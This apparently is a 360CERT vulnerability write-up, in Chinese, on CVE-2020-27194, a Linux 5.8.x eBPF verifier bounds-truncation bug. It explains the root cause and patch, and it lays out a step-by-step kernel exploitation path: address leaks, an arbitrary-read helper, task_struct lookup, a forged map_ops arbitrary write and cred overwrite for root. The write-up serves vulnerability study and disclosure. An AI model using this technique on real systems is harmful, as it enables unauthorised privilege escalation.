# CVE-2020-27194：Linux Kernel eBPF模块提权漏洞的分析与利用

阅读量 **180409**

发布时间 : 2020-11-04 10:00:23

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t012dcf9003833056e3.png)

## 0x01 漏洞背景

2020年11月01日， 360CERT监测到国外安全研究人员simon 通过fuzz 在Linux
内核的ebpf模块中发现一个越界读写的漏洞，可导致权限提升，CVE编号: CVE-2020-27194。

该漏洞是由于eBPF验证程序中进行or操作时未正确计算寄存器范围，进而引发越界读取和写入。该漏洞存在于 _5.8.x_
内核分支，目前有部分发行版使用了此分支，如Fedora 33 和 Ubuntu 20.10 。

2020年11月03日，360CERT对该漏洞进行了详细分析，并完成漏洞利用。

## 0x02 风险等级

360CERT对该漏洞的评定结果如下

评定方式 | 等级  
---|---  
威胁等级 | 高危  
影响面 | 一般  
360CERT评分 | 7.8  
  
## 0x03 影响版本

影响 _5.8.x_ 版本及以上的Linux 内核分支

影响应用该分支的发行版：Fedora 33 、Ubuntu 20.10

## 0x04 环境搭建

（1）下载源码

    
    
    git clone <https://github.com/torvalds/linux.git>
    git checkout 5b9fbeb75b6a98955f628e205ac26689bcb1383e~1
    

5b9fbeb75b6a98955f628e205ac26689bcb1383e 为修复漏洞的补丁，我们将分支切换到前一个补丁

（2）编译内核

    
    
    make default
    make menuconfig
    make -j8
    

关闭随机化，开启调试信息和ebpf选项

    
    
    Processor type and features  --->
        [ ]   Randomize the address of the kernel image (KASLR) 
    
    Kernel hacking  --->
        Compile-time checks and compiler options  --->  
            [*] Compile the kernel with debug info
    
    General setup  ---> 
        [*] Enable bpf() system call   
    

## 0x05 漏洞分析

### 5.1 eBPF 介绍

eBPF是extended Berkeley Packet
Filter的缩写。起初是用于捕获和过滤特定规则的网络数据包,现在也被用在防火墙，安全，内核调试与性能分析等领域。

eBPF程序的运行过程如下：在用户空间生产eBPF“字节码”，然后将“字节码”加载进内核中的“虚拟机”中，然后进行一些列检查，通过则能够在内核中执行这些“字节码”。类似Java与JVM虚拟机，但是这里的虚拟机是在内核中的。

bpf程序的执行流程如下图：

### 5.2 漏洞成因

漏洞点在scalar_min_max_or()函数：

    
    
    static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,
                    struct bpf_reg_state *src_reg)
    {
        bool src_known = tnum_subreg_is_const(src_reg->var_off);
        bool dst_known = tnum_subreg_is_const(dst_reg->var_off);
        struct tnum var32_off = tnum_subreg(dst_reg->var_off);
        s32 smin_val = src_reg->smin_value;
        u32 umin_val = src_reg->umin_value;
    
        /* Assuming scalar64_min_max_or will be called so it is safe
         * to skip updating register for known case.
         */
        if (src_known && dst_known)
            return;
    
        /* We get our maximum from the var_off, and our minimum is the
         * maximum of the operands' minima
         */
        dst_reg->u32_min_value = max(dst_reg->u32_min_value, umin_val);
        dst_reg->u32_max_value = var32_off.value | var32_off.mask;
        if (dst_reg->s32_min_value < 0 || smin_val < 0) {
            /* Lose signed bounds when ORing negative numbers,
             * ain't nobody got time for that.
             */
            dst_reg->s32_min_value = S32_MIN;
            dst_reg->s32_max_value = S32_MAX;
        } else {
            /* ORing two positives gives a positive, so safe to
             * cast result into s64.
             */
            dst_reg->s32_min_value = dst_reg->umin_value; // 【1】
            dst_reg->s32_max_value = dst_reg->umax_value;
        }
    }
    

由于【1】处的将64位的值赋值到32位的变量上，导致截断，进而错误计算了寄存器的范围，从而绕过bpf的检查，导致越界读写。

具体可以看Poc生成的日志：

    
    
        ……
    9: (79) r5 = *(u64 *)(r0 +0)
     R0=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    10: R0=map_value(id=0,off=0,ks=4,vs=256,imm=0) R5_w=invP(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    10: (bf) r8 = r0
    11: R0=map_value(id=0,off=0,ks=4,vs=256,imm=0) R5_w=invP(id=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256?
    11: (b7) r0 = 1
    12: R0_w=invP1 R5_w=invP(id=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    12: (18) r6 = 0x600000002
    14: R0_w=invP1 R5_w=invP(id=0) R6_w=invP25769803778 R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10?
    14: (ad) if r5 < r6 goto pc+1
     R0_w=invP1 R5_w=invP(id=0,umin_value=25769803778) R6_w=invP25769803778 R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks?
    15: R0_w=invP1 R5_w=invP(id=0,umin_value=25769803778) R6_w=invP25769803778 R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0?
    15: (95) exit
    16: R0_w=invP1 R5_w=invP(id=0,umax_value=25769803777,var_off=(0x0; 0x7ffffffff)) R6_w=invP25769803778 R8_w=map_value(id=0,off=0,ks=4,vs=256,i?
    16: (25) if r5 > 0x0 goto pc+1
     R0_w=invP1 R5_w=invP(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R6_w=invP25769803778 R8_w=map_value(id=0,off=0,ks?
    17: R0_w=invP1 R5_w=invP(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R6_w=invP25769803778 R8_w=map_value(id=0,off=0?
    17: (95) exit
    18: R0=invP1 R5=invP(id=0,umin_value=1,umax_value=25769803777,var_off=(0x0; 0x77fffffff),u32_max_value=2147483647) R6=invP25769803778 R8=map_?
    18: (47) r5 |= 0
    19: R0=invP1 R5_w=invP(id=0,umin_value=1,umax_value=32212254719,var_off=(0x1; 0x700000000),s32_max_value=1,u32_max_value=1) R6=invP2576980377?
    19: (bc) w6 = w5
    20: R0=invP1 R5_w=invP(id=0,umin_value=1,umax_value=32212254719,var_off=(0x1; 0x700000000),s32_max_value=1,u32_max_value=1) R6_w=invP1 R8=map?
    20: (77) r6 >>= 1
    21: R0=invP1 R5_w=invP(id=0,umin_value=1,umax_value=32212254719,var_off=(0x1; 0x700000000),s32_max_value=1,u32_max_value=1) R6_w=invP0 R8=map?
            ……
    

9：用户的值通过r5寄存器传入值 2

10：r0 赋值给r8，r0保存map的地址，对触发漏洞无影响

11：r0 赋值为1，否则会认为r0 泄露map指针产生报错

12： r6赋值为0x600000002

14：通过r5 < r6 的条件判断使得r5寄存器的无符号范围最大为umax_value=25769803777=0x600000001

16：通过r > 0x0 的条件判断使得r5寄存器的无符号范围最小为umin_value=1

18：对r5进行or运算，触发漏洞函数scalar_min_max_or，调用到漏洞函数中的【1】处，赋值后r5寄存器的s32_min_value=1，s32_max_value=1

19：将r5赋值为r6，得到r6为invP1 ，说明检查模块认为r6是常数1，而实际此时r6为2

20：对r6进行右移操作，此时检查模块认为r6得到的结果为invP0（常数0），而实际此时r6为1

具体调试过程如下：

dst_reg->umin_value 的值为1， dst_reg->umax_value
的值为0x600000001，而在赋值dst_reg->s32_max_value的过程中发生了截断（64位的值赋值到32位的有符号整数），导致dst_reg->s32_max_value的值为1，此时目标寄存器的32位范围为（1，1），因此bpf的验证模块认为这是常数1。

当我们传入2时，对其进行右移操作，验证模块认为是1>>1=0，而实际是2 >>1 =
1，所以可以对其进行乘法操作构造成任意数，因为在验证模块看来只是0乘以任意数，结果都是0，从而绕过检查，可以对map指针进行任意加减，造成越界读写。

## 0x06 漏洞利用

该漏洞利用和CVE-2020-8835 类似，可以参考之前笔者对CVE-2020-8835 的利用构造：

### 6.1 越界读写进行信息泄露

    
    
    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,key_size,value_size,max_entries,0);
    

key_size：表示索引的大小范围，key_size=sizeof(int)=4.  
value_size：表示map数组每个元素的大小范围，可以任意，只要控制在一个合理的范围
max_entries：表示map数组的大小，编写利用时将其设为1

**泄露内核地址**

bpf_create_fd 创建的是一整个bpf_array结构，我们传入的数据放在value[] 处

    
    
    struct bpf_array {
        struct bpf_map map;
        u32 elem_size;
        u32 index_mask;
        struct bpf_array_aux *aux;
        union {
            char value[];//<--- elem
            void *ptrs[];
            void *pptrs[];
        };
    }
    

value[]在bpf_array整个结构的偏移为0x110，所以*(&map-0x110)为bpf_map的结构地址

    
    
    struct bpf_map {
        const struct bpf_map_ops *ops;
        struct bpf_map *inner_map_meta;
        void *security;
        enum bpf_map_type map_type;
        //....
        u64 writecnt;
    }
    

bpf_map 有一个const struct bpf_map_ops *ops; 字段，当我们创建的map是BPF_MAP_TYPE_ARRAY
的时候保存的是array_map_ops, array_map_ops 是一个全局变量，可以用于泄露内核地址。

**泄露map_elem地址**

&exp_elem[0]-0x110+0xc0（wait_list）处保存着指向自身的地址，用于泄露exp_elem的地址

    
    
    (gdb) p/x &(*(struct bpf_array *)0x0)->map.freeze_mutex.wait_list
    $9 = 0xc0
    

### 构造任意读

通过BPF_OBJ_GET_INFO_BY_FD 命令进行任意读，BPF_OBJ_GET_INFO_BY_FD 会调用
bpf_obj_get_info_by_fd：

    
    
    case BPF_OBJ_GET_INFO_BY_FD:
            err = bpf_obj_get_info_by_fd(&attr, uattr);
    
    
    
    #define BPF_OBJ_GET_INFO_BY_FD_LAST_FIELD info.info
    
    static int bpf_obj_get_info_by_fd(const union bpf_attr *attr,
                      union bpf_attr __user *uattr)
    {
        int ufd = attr->info.bpf_fd;
        struct fd f;
        int err;
    
        if (CHECK_ATTR(BPF_OBJ_GET_INFO_BY_FD))
            return -EINVAL;
    
        f = fdget(ufd);
        if (!f.file)
            return -EBADFD;
    
        if (f.file->f_op == &bpf_prog_fops)
            err = bpf_prog_get_info_by_fd(f.file->private_data, attr,
                              uattr);
        else if (f.file->f_op == &bpf_map_fops)
            err = bpf_map_get_info_by_fd(f.file->private_data, attr,
                             uattr);
                             ……
    

之后调用 bpf_map_get_info_by_fd：

    
    
    static int bpf_map_get_info_by_fd(struct bpf_map *map,
                      const union bpf_attr *attr,
                      union bpf_attr __user *uattr)
    {
        struct bpf_map_info __user *uinfo = u64_to_user_ptr(attr->info.info);
        struct bpf_map_info info = {};
        u32 info_len = attr->info.info_len;
        int err;
    
        err = bpf_check_uarg_tail_zero(uinfo, sizeof(info), info_len);
        if (err)
            return err;
        info_len = min_t(u32, sizeof(info), info_len);
    
        info.type = map->map_type;
        info.id = map->id;
        info.key_size = map->key_size;
        info.value_size = map->value_size;
        info.max_entries = map->max_entries;
        info.map_flags = map->map_flags;
        memcpy(info.name, map->name, sizeof(map->name));
    
        if (map->btf) {
            info.btf_id = btf_id(map->btf); // 修改map->btf 就可以进行任意读，获得btf_id，在btf结构偏移0x58处
            info.btf_key_type_id = map->btf_key_type_id;
            info.btf_value_type_id = map->btf_value_type_id;
        }
    
        if (bpf_map_is_dev_bound(map)) {
            err = bpf_map_offload_info_fill(&info, map);
            if (err)
                return err;
        }
    
        if (copy_to_user(uinfo, &info, info_len) || // 传到用户态的info中，泄露信息
            put_user(info_len, &uattr->info.info_len))
            return -EFAULT;
    
        return 0;
    }
    
    
    
    u32 btf_id(const struct btf *btf)
    {
        return btf->id;
    }
    (gdb) p/x &(*(struct btf*)0)->id  #获取id在btf结构中的偏移
    $56 = 0x58
    
    (gdb) p/x &(*(struct bpf_map_info*)0)->btf_id #获取btf_id在bpf_map_info中偏移
    $57 = 0x40
    

所以只需要修改map->btf 为 target_addr-0x58，就可以泄露到用户态info中，泄漏的信息在struct bpf_map_info
结构偏移0x40处，由于是u32类型，所以只能泄露4个字节。

利用代码如下：

    
    
    static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) 
    {
        union bpf_attr attr = {
            .map_fd = mapfd,
            .key = (__u64)&key,
            .value = (__u64)value,
                .info.bpf_fd = mapfd,
                .info.info_len = 0x100,
                .info.info = (__u64)info,
        };
    
        syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
        return *(uint32_t *)((char *)info+0x40);
    }
    

### 6.2 查找task_struct

    
    
    ksymtab 保存init_pid_ns结构的偏移，init_pid_ns字符串的偏移
    kstrtab 保存init_pid_ns的字符串
    
    (gdb) p &__ksymtab_init_pid_ns
    $4 = (<data variable, no debug info> *) 0xffffffff82322eb4
    (gdb) x/2wx 0xffffffff82322eb4
    0xffffffff82322eb4:    0x001264cc    0x0000a28f
    (gdb) x/2s 0xffffffff82322eb8+0x0000a28f
    0xffffffff8232d147:    "init_pid_ns"
    0xffffffff8232d153:    "put_pid"
    (gdb) x/4gx 0xffffffff82322eb4+0x001264cc
    0xffffffff82449380 <init_pid_ns>:    0x0000000000000002    0x0080000400000000
    0xffffffff82449390 <init_pid_ns+16>:    0x0000000000000000    0x0000000000000000    
    

所以我们通过搜索”init_pid_ns” 字符串可以得到`__kstrtab_init_pid_ns`的地址，之后再通过搜索匹配
地址+该地址上四个字节（表示偏移）是否等于`__kstrtab_init_pid_ns`的地址
来判断是否为`__ksymtab_init_pid_ns`，此时找到的地址为`__ksymtab_init_pid_ns+4`，
减去4就是`__ksymtab_init_pid_ns`，上面有`init_pid_ns`结构的偏移，与`__ksymtab_init_pid_ns`地址相加就可以得到`init_pid_ns`结构的地址。

之后通过pid 和
init_pid_ns查找对应pid的task_struct，这里其实就是要理清内核的查找过程，在写利用的时候模拟走一遍。最后找到task_struct中cred位置。
内核是通过find_task_by_pid_ns函数实现查找过程的：

    
    
    struct task_struct *find_task_by_pid_ns(pid_t nr, struct pid_namespace *ns)
    {
        RCU_LOCKDEP_WARN(!rcu_read_lock_held(),
                 "find_task_by_pid_ns() needs rcu_read_lock() protection");
        return pid_task(find_pid_ns(nr, ns), PIDTYPE_PID);
    }
    

nr 为当前进程的pid，ns 为init_pid_ns结构地址，我们需要的是idr字段的内容

    
    
    struct pid *find_pid_ns(int nr, struct pid_namespace *ns)
    {
        return idr_find(&ns->idr, nr);
    }
    
    
    
    lib/idr.c：
    void *idr_find(const struct idr *idr, unsigned long id)
    {
        return radix_tree_lookup(&idr->idr_rt, id - idr->idr_base);
    }
    

需要获取&idr->idr_rt 和 idr->idr_base

    
    
    lib/radix-tree.c：
    void *radix_tree_lookup(const struct radix_tree_root *root, unsigned long index)
    {
        return __radix_tree_lookup(root, index, NULL, NULL);
    }
    
    
    
    void *__radix_tree_lookup(const struct radix_tree_root *root,
                  unsigned long index, struct radix_tree_node **nodep,
                  void __rcu ***slotp)
    {
        struct radix_tree_node *node, *parent;
        unsigned long maxindex;
        void __rcu **slot;
    
     restart:
        parent = NULL;
        slot = (void __rcu **)&root->xa_head;
        radix_tree_load_root(root, &node, &maxindex); //将root->xa_head的值赋给node
        if (index > maxindex)
            return NULL;
    
        while (radix_tree_is_internal_node(node)) {
            unsigned offset;
    
            parent = entry_to_node(node); // parent = node & 0xffff ffff ffff fffd
            offset = radix_tree_descend(parent, &node, index); //循环查找当前进程的node
            slot = parent->slots + offset; //
            if (node == RADIX_TREE_RETRY)
                goto restart;
            if (parent->shift == 0) // 当shift为0时，退出，说明找到当前进程的node
                break;
        }
    
        if (nodep)
            *nodep = parent; 
        if (slotp)
            *slotp = slot; 
        return node; 
    }
    

重点看radix_tree_descend函数实现：

    
    
    RADIX_TREE_MAP_MASK : 0x3f
    static unsigned int radix_tree_descend(const struct radix_tree_node *parent, 
                struct radix_tree_node **nodep, unsigned long index)
    {
        unsigned int offset = (index >> parent->shift) & RADIX_TREE_MAP_MASK;  // 要读取parent->shift的值，并与0x3f 与计算
        void __rcu **entry = rcu_dereference_raw(parent->slots[offset]);  // 获取parent->slots[offset] 作为下一个node
    
        *nodep = (void *)entry; //
    
        return offset; //
    }
    

radix_tree_node的结构如下：

    
    
    #define radix_tree_node xa_node
    
    struct xa_node {
        unsigned char    shift;        /* Bits remaining in each slot */
        unsigned char    offset;        /* Slot offset in parent */
        unsigned char    count;        /* Total entry count */
        unsigned char    nr_values;    /* Value entry count */
        struct xa_node __rcu *parent;    /* NULL at top of tree */
        struct xarray    *array;        /* The array we belong to */
        union {
            struct list_head private_list;    /* For tree user */
            struct rcu_head    rcu_head;    /* Used when freeing node */
        };
        void __rcu    *slots[XA_CHUNK_SIZE];
        union {
            unsigned long    tags[XA_MAX_MARKS][XA_MARK_LONGS];
            unsigned long    marks[XA_MAX_MARKS][XA_MARK_LONGS];
        };
    };
    

获得当前进程的node后就可以通过pid_task获取相应的task_struct：

    
    
    enum pid_type
    {
        PIDTYPE_PID,
        PIDTYPE_TGID,
        PIDTYPE_PGID,
        PIDTYPE_SID,
        PIDTYPE_MAX,
    };
    type 为PIDTYPE_PID， 值为0
    
    #define hlist_entry(ptr, type, member) container_of(ptr,type,member)
    
    struct task_struct *pid_task(struct pid *pid, enum pid_type type)
    {
        struct task_struct *result = NULL;
        if (pid) {
            struct hlist_node *first;
            first = rcu_dereference_check(hlist_first_rcu(&pid->tasks[type]), //获取&pid->tasks[0] 的内容
                              lockdep_tasklist_lock_is_held());
            if (first)
                result = hlist_entry(first, struct task_struct, pid_links[(type)]);// first为pid_links[0]的地址，由此获得task_struct的起始地址
        }
        return result;
    }
    

### 6.3 构造任意写

在exp_elem上填充伪造的array_map_ops，伪造的array_map_ops中将map_push_elem
填充为map_get_next_key ，这样调用map_push_elem时就会调用map_get_next_key
，并将&exp_elem[0]的地址覆盖到exp_map[0]，同时要修改 map 的一些字段绕过一些检查

    
    
    spin_lock_off = 0
    max_entries = 0xffff ffff 
    //写入的index要满足(index >= array->map.max_entries), 将map_entries改成0xffff ffff
    map_type = BPF_MAP_TYPE_STACK
    //map 的类型是BPF_MAP_TYPE_QUEUE或者BPF_MAP_TYPE_STACK时，map_update_elem 会调用map_push_elem 
    

最后调用bpf_update_elem任意写内存

    
    
     bpf_update_elem->map_update_elem(mapfd, &key, &value, flags) -> map_push_elem(被填充成 map_get_next_key )
     ->array_map_get_next_key 
    
    
    
    static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)   
    {                                                                                   
        struct bpf_array *array = container_of(map, struct bpf_array, map);             
        u32 index = key ? *(u32 *)key : U32_MAX;                                        
        u32 *next = (u32 *)next_key;                                                    
    
        if (index >= array->map.max_entries) {    //index                                      
            *next = 0;                                                                  
            return 0;                                                                   
        }                                                                               
    
        if (index == array->map.max_entries - 1)                                        
            return -ENOENT;                                                             
    
        *next = index + 1;                                                              
        return 0;                                                                       
    }
    

map_push_elem 的参数是value 和 uattr 的 flags, 分别对应array_map_get_next_key 的 key 和
next_key 参数，之后有index = value[0]，next = flags ， 最终效果是 *flags =
value[0]+1，这里index 和 next 都是 u32 类型， 所以可以任意地址写 4个byte。

所以利用的整体思路是：

  1. 通过漏洞，使得传进来的值为2，而验证模块认为是1，进而通过右移和乘法操作构造任意数，对map指针进行加减造成越界读写。
  2. 通过&exp_elem[0]-0x110，获得exp_map的地址，exp_map[0] 保存着array_map_ops的地址，可以用于泄露内核地址
  3. &exp_elem[0]-0x110+0xc0（wait_list）处保存着指向自身的地址，用于泄露exp_elem的地址
  4. 利用任意读查找init_pid_ns结构地址
  5. 利用进程pid和init_pid_ns结构地址获取当前进程的task_struct
  6. 在exp_elem上填充伪造的array_map_ops
  7. 修改 map 的一些字段绕过一些检查
  8. 调用 bpf_update_elem任意写内存
  9. 修改进程task_struct 的cred进行提权。

提权效果图：

## 0x07 补丁分析

按正常处理思路，寄存器32位的范围和64位的范围应该分开处理，漏洞的成因正是由于直接将64位值赋值给32位的变量，导致截断，因此补丁就是将32位和64位的情况分开，修正赋值的内容，阻止了整数截断的情况。

## 0x08 时间线

**2020-11-01** 作者公开漏洞信息

**2020-11-02** 360CERT完成漏洞利用

**2020-11-03** 360CERT发布漏洞分析与利用报告

## 0x09 参考链接

  1. <https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/>
  2. <https://github.com/torvalds/linux/commit/5b9fbeb75b6a98955f628e205ac26689bcb1383e>
  3. <https://xz.aliyun.com/t/7690>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360CERT安全通告** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/221545](/post/id/221545)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __3赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t013be54b59d8ac5fe6.jpg)
360CERT安全通告

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

